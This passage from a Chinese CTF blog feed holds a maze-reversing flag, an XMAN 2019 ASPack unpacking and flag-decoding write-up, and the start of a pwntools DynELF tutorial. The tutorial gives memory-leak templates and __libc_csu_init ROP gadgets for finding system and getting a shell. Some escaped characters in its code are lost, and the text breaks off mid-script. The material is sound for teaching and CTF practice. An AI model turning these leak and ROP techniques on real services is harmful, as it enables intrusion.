class="number">35</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">10</span> * row + line] == <span class="number">43</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难得出<code>flag</code>，即为以<code>a</code>, <code>w</code>, <code>s</code>, <code>d</code>为方向键走出迷宫的路径</p><p><code>flag{wwwwaaaasssaassssdddssddddw}</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XMAN-2019-福州-Re-reverse2_final</title>
      <link href="/2019/08/08/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-Re-reverse2-final/"/>
      <url>/2019/08/08/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-Re-reverse2-final/</url>
      
        <content type="html"><![CDATA[<p>终于学会如何手动脱ASPack类型的壳了。“壳”就是专门压缩或加密的工具，通过在压缩、加密的过程中加入保护性代码，程序文件会失去原来的程序结构，改变代码的表。现形式，增加被篡改和反编译的难度，达到保护程序内部逻辑的效果。</p><p>壳主要有压缩壳和加密壳两种</p><p>压缩壳</p><p>以减小软件体积和改变软件可执行代码的特征为目的压缩壳的主要目的对程序进行压缩，对程序的保护不是该类壳的重点。主要有<strong>ASPack</strong>、<strong>UPX</strong>和<strong>PECompact</strong>等。此题即为<strong>ASPack</strong>类型的壳。</p><p>加密壳</p><p>以保护软件为目的，根据用户输入的密码用相应的加密算法对原程序进行加密。主要有<strong>ASProtect</strong>、<strong>Armadillo</strong>、<strong>EXECryptor</strong>以及<strong>Themida</strong>等。</p><p>由于近年来CTF比赛中带壳的逆向题出现频率稍有增加，在静态分析之前，进行查壳是非常有必要的，常用的工具有PEID等，进行查壳后，如果是简单且常见的壳如UPX等，那么直接可以使用工具完成脱壳，如果一时半会找不到可用的工具，也可以尝试手工脱壳，例如ASPack就能够采用ESP定律来脱除。如果是侧重考察脱壳的题，一般程序本身就比较简单了，可以这样说，这类题如果能成功脱壳，基本上也算是做出来了。</p><p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>首先我们尝试用IDA Pro直接打开这个可执行文件</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%887.11.04.png" alt></p><p>IDA Pro只出现了<code>start</code>函数，且可以发现出现了很多奇怪的数据可以考虑是不是一个带壳的文件，我们使用工具<strong>PEID</strong>不难查出这就是一个<strong>ASPack</strong>类型的壳</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%887.19.45.png" alt></p><p>然后我们把程序拖进OllyDbg进行动态调试</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.01.35.png" alt></p><p>可以看到很明显的加壳代码逻辑<code>pushad</code>指令将当前所有寄存器的数据压入栈中，保存现场，当壳程序执行完毕后恢复主程序，这里涉及到一个<strong>ESP</strong>定律</p><p><strong>ESP</strong>定律——栈平衡原理</p><ol><li><ul><li>▉  加壳软件，必须保证外壳初始化的现场环境(寄存器)与原程序的现场环境相同</li><li>▉  加壳程序初始化时保存各寄存器的值，外壳执行完毕，再恢复各寄存器内容，最后再跳到原程序执行</li><li>▉  程序通常使用 <strong>pushad/popad</strong>、<strong>pushfd/popfd</strong> 指令来保存与恢复现场环境</li></ul></li></ol><p>所以我们只需要按下F7查看右边寄存器窗口ESP的值，选中右键数据窗口中跟随然后进行下硬件断点</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.01.47.png" alt></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.02.11.png" alt></p><p>然后在按下<strong>F9</strong>运行程序，程序会在断点处停下就会看到</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.00.43.png" alt></p><p>上面有<code>JNZ</code>意思是不等于0就跳转，还看到<code>PUSH</code> 意思是压入一个地址然后在<code>RETN</code>返回，因为是停在<code>JNZ</code>上箭头显示为红色(红色代表跳转已经实现) ，就直接<code>F7</code>直到跳到正确的入口地址</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.01.12.png" alt></p><p>至此已找到主函数的入口，OEP也已经找到。在执行到原程序入口点后，外壳程序已经将原程序的各个段以及导入表等数据都恢复完成。为了能够调试分析程序，我们需要使用内存dump工具，把程序导出</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.02.41.png" alt></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.02.58.png" alt></p><p>这里我们直接获取<code>EIP</code>作为<code>OEP</code>即可，我们也需要注意记住<code>OEP</code>的值<code>1B98</code>在接下来的恢复导入表的时候有用。现在我们来恢复导入表，首先我们启动原程序，让<strong>Imp Rec</strong>工具抓取到它的进程</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.03.54.png" alt></p><p>现在我们要做的就是，输入我们之前获得的<code>OEP</code>，然后执行<strong>自动查找IAT</strong>和<strong>获取输入表</strong>，然后<strong>转储到文件</strong>，文件即为我们之前<code>dump</code>出的主程序</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.04.08.png" alt></p><p>到这里为止我们的所有脱壳项目已经完成，用IDA Pro打开我们的脱壳程序，可以发现导入表也已经调用成功，反汇编代码也比较正常了，我们可以很快的找到main函数</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.05.57.png" alt></p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>发现我们输入的字符串被程序加密后与“<code>DDCTF{reverseME}</code>”作比较；也就是flag输入进去之后会被程序加密为“<code>DDCTF{reverseME}</code>”；将其拉入ida分析很明显，<code>sub_401240</code>函数便是加密函数；进入内部查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall sub_401240@&lt;eax&gt;(<span class="keyword">const</span> <span class="keyword">char</span> *a1@&lt;esi&gt;, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+Bh] [ebp-405h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+Ch] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+Dh] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v9;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = a1[v3];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(a1[v3] - <span class="number">48</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v5 - <span class="number">65</span>) &lt;= <span class="number">5u</span> )</span><br><span class="line">          v9 = v5 - <span class="number">55</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9 = a1[v3] - <span class="number">48</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = a1[v3 + <span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(a1[v3 + <span class="number">1</span>] - <span class="number">48</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v6 - <span class="number">65</span>) &lt;= <span class="number">5u</span> )</span><br><span class="line">          v4 = v6 - <span class="number">55</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = a1[v3 + <span class="number">1</span>] - <span class="number">48</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      v3 += <span class="number">2</span>;</span><br><span class="line">      *(&amp;v10 + v7) = v4 | <span class="number">16</span> * v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; v2 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_401000(v2 / <span class="number">2</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知程序为一个加密算法。将所输入的字符串的每个字符分别与<code>0x402FF8</code>相加，在此处所对应的字符即为加密后的新字符。写一个小脚本，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[]=<span class="string">"1~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]1[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)("</span>;</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> c[]=<span class="string">"DDCTF&#123;reverseME&#125;"</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> n=<span class="string">'!'</span>;n&lt;<span class="number">126</span>;n++)</span><br><span class="line">        &#123;</span><br><span class="line">            b[i]=a[(<span class="keyword">int</span>)n<span class="number">-31</span>];</span><br><span class="line">            <span class="keyword">if</span>(b[i]==c[i])</span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="built_in">cout</span>&lt;&lt;n;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0x3A</span>,<span class="number">0xFC</span>,<span class="number">0x30</span>,<span class="number">0x00</span>,<span class="number">0xC5</span>,<span class="number">0x03</span>,<span class="number">0xCF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFE</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7E</span>,<span class="number">0x7D</span>,<span class="number">0x7C</span>,<span class="number">0x7B</span>,<span class="number">0x7A</span>,<span class="number">0x79</span>,<span class="number">0x78</span>,<span class="number">0x77</span>,<span class="number">0x76</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x72</span>,<span class="number">0x71</span>,<span class="number">0x70</span>,<span class="number">0x6F</span>,<span class="number">0x6E</span>,<span class="number">0x6D</span>,<span class="number">0x6C</span>,<span class="number">0x6B</span>,<span class="number">0x6A</span>,<span class="number">0x69</span>,<span class="number">0x68</span>,<span class="number">0x67</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x64</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x60</span>,<span class="number">0x5F</span>,<span class="number">0x5E</span>,<span class="number">0x5D</span>,<span class="number">0x5C</span>,<span class="number">0x5B</span>,<span class="number">0x5A</span>,<span class="number">0x59</span>,<span class="number">0x58</span>,<span class="number">0x57</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x54</span>,<span class="number">0x53</span>,<span class="number">0x52</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x4F</span>,<span class="number">0x4E</span>,<span class="number">0x4D</span>,<span class="number">0x4C</span>,<span class="number">0x4B</span>,<span class="number">0x4A</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x47</span>,<span class="number">0x46</span>,<span class="number">0x45</span>,<span class="number">0x44</span>,<span class="number">0x43</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,<span class="number">0x40</span>,<span class="number">0x3F</span>,<span class="number">0x3E</span>,<span class="number">0x3D</span>,<span class="number">0x3C</span>,<span class="number">0x3B</span>,<span class="number">0x3A</span>,<span class="number">0x39</span>,<span class="number">0x38</span>,<span class="number">0x37</span>,<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0x2F</span>,<span class="number">0x2E</span>,<span class="number">0x2D</span>,<span class="number">0x2C</span>,<span class="number">0x2B</span>,<span class="number">0x2A</span>,<span class="number">0x29</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x26</span>,<span class="number">0x25</span>,<span class="number">0x24</span>,<span class="number">0x23</span>,<span class="number">0x22</span>,<span class="number">0x21</span>,<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x70</span>,<span class="number">0x19</span>,<span class="number">0x38</span>,<span class="number">0x00</span>,<span class="number">0x80</span>,<span class="number">0x12</span>,<span class="number">0x38</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">str1 = <span class="string">"DDCTF&#123;reverseME&#125;"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">    flag += chr(table.index(ord(str1[i])))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>借助DynELF实现无libc的漏洞利用小结</title>
      <link href="/2019/08/06/%E2%95%9C%CE%A6%E2%95%93%C2%B7DynELF%E2%95%A9%E2%95%A1%E2%95%A7%E2%95%93%E2%95%AC%E2%96%90libc%E2%95%A1%E2%94%80%E2%94%AC%E2%8C%90%E2%95%A2%E2%94%A4%E2%94%94%E2%88%9A%E2%95%99%E2%94%9C%E2%95%A8%C3%AD%E2%95%9C%C3%9F/"/>
      <url>/2019/08/06/%E2%95%9C%CE%A6%E2%95%93%C2%B7DynELF%E2%95%A9%E2%95%A1%E2%95%A7%E2%95%93%E2%95%AC%E2%96%90libc%E2%95%A1%E2%94%80%E2%94%AC%E2%8C%90%E2%95%A2%E2%94%A4%E2%94%94%E2%88%9A%E2%95%99%E2%94%9C%E2%95%A8%C3%AD%E2%95%9C%C3%9F/</url>
      
        <content type="html"><![CDATA[<p><strong>前言</strong></p><p>在没有目标系统libc文件的情况下，我们可以使用pwntools的DynELF模块来泄漏地址信息，从而获取到shell。本文针对linux下的puts和write，分别给出了实现DynELF关键函数leak的方法，并通过3道CTF题目介绍了这些方法的具体应用情况。</p><p><strong>DynELF</strong></p><p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./xxx'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br></pre></td></tr></table></figure><p>需要使用者进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。</p><p><strong>使用条件</strong></p><p>不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</p><p><strong>1）目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；</strong></p><p><strong>2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</strong></p><p>当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</p><p><strong>write函数</strong></p><p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。</p><p>在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop  rdx; ret”等3个传参的gadget。此时，可以考虑使用<strong>libc_csu_init函数的通用gadget，具体原理请参见<a href="http://www.cnblogs.com/Ox9A82/p/5487725.html" target="_blank" rel="noopener">文章</a>。简单的说，就是通过</strong>libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。</p><p>第一段代码如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040075A   pop  rbx  #需置为0，为配合第二段代码的call指令寻址</span><br><span class="line">.text:000000000040075B   pop  rbp  #需置为1</span><br><span class="line">.text:000000000040075C   pop  r12  #需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令</span><br><span class="line">.text:000000000040075E   pop  r13  #write函数的第三个参数</span><br><span class="line">.text:0000000000400760   pop  r14  #write函数的第二个参数</span><br><span class="line">.text:0000000000400762   pop  r15  #write函数的第一个参数</span><br><span class="line">.text:0000000000400764   retn</span><br></pre></td></tr></table></figure><p>第二段代码如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400740   mov  rdx, r13</span><br><span class="line">.text:0000000000400743   mov  rsi, r14</span><br><span class="line">.text:0000000000400746   mov  edi, r15d</span><br><span class="line">.text:0000000000400749   call  qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure><p>这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。</p><p>这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。</p><p><strong>puts函数</strong></p><p>puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p><p>为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“n“这一特点，分两种情况来解决。</p><p><strong>（1）puts输出完后就没有其他输出</strong>，在这种情况下的leak函数可以这么写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">''</span></span><br><span class="line">  payload = xxx</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="keyword">print</span> p.recvuntil(<span class="string">'xxxn'</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了</span></span><br><span class="line">    <span class="comment">#以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span></span><br><span class="line">    c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:  <span class="comment">#接收到的上一个字符为回车符，而当前接收不到新字符，则</span></span><br><span class="line">      buf = buf[:<span class="number">-1</span>]             <span class="comment">#删除puts函数输出的末尾回车符</span></span><br><span class="line">      buf += <span class="string">"x00"</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  <span class="comment">#取指定字节数</span></span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p><strong>（2）puts输出完后还有其他输出</strong>，在这种情况下的leak函数可以这么写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">""</span></span><br><span class="line">  payload = xxx</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="keyword">print</span> p.recvuntil(<span class="string">"xxxn"</span>)) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = p.recv(<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'n'</span> <span class="keyword">and</span> c == <span class="string">"x"</span>:  <span class="comment">#一定要找到泄漏信息的字符串特征</span></span><br><span class="line">      data = buf[:<span class="number">-1</span>]                     </span><br><span class="line">      data += <span class="string">"x00"</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    